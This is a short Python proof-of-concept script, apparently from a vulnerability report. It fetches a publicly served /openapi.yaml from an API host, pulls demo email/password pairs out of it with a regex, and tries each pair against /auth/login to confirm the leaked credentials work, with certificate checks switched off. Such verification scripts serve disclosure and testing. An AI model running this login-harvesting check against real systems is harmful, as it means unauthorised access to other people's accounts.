     1	#!/usr/bin/env python3
     2	"""Verify: /openapi.yaml is publicly served AND contains working demo credentials.
     3	
     4	The check is intentionally minimal: fetch the schema anonymously, look for the
     5	'Demo Accounts' block, attempt a login with each pair, and confirm at least one
     6	account authenticates successfully.
     7	
     8	Optional env vars:
     9	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    10	
    11	Exit code:
    12	    0 = VULNERABLE (schema public AND at least one disclosed credential works)
    13	    1 = NOT VULNERABLE (schema gated, or credentials no longer valid)
    14	
    15	Usage:
    16	    python3 verify.py
    17	"""
    18	import os
    19	import re
    20	import sys
    21	
    22	import requests
    23	import urllib3
    24	
    25	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    26	
    27	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    28	
    29	
    30	def check():
    31	    r = requests.get(f"{TARGET_URL}/openapi.yaml", verify=False, timeout=15)
    32	    if r.status_code != 200 or "openapi:" not in r.text[:200]:
    33	        print(f"[NOT VULNERABLE] /openapi.yaml is not publicly served "
    34	              f"(HTTP {r.status_code})")
    35	        sys.exit(1)
    36	
    37	    body = r.text
    38	    pairs = re.findall(r"([\w.+-]+@example\.com)\s*/\s*(\S+)", body)
    39	    pairs = list(dict.fromkeys(pairs))
    40	    if not pairs:
    41	        print("[NOT VULNERABLE] Schema is public but contains no demo credentials")
    42	        sys.exit(1)
    43	
    44	    working = []
    45	    for email, password in pairs:
    46	        r = requests.post(f"{TARGET_URL}/auth/login",
    47	                          json={"email": email, "password": password},
    48	                          verify=False, timeout=10)
    49	        if r.status_code == 200 and r.json().get("token"):
    50	            working.append(email)
    51	
    52	    if working:
    53	        print(f"[VULNERABLE] Public /openapi.yaml discloses working credentials "
    54	              f"({len(body):,} bytes)")
    55	        print(f"             Accounts authenticated with disclosed passwords: "
    56	              f"{', '.join(working)}")
    57	        sys.exit(0)
    58	
    59	    print("[NOT VULNERABLE] Schema is public but disclosed credentials no longer "
    60	          "authenticate")
    61	    sys.exit(1)
    62	
    63	
    64	if __name__ == "__main__":
    65	    check()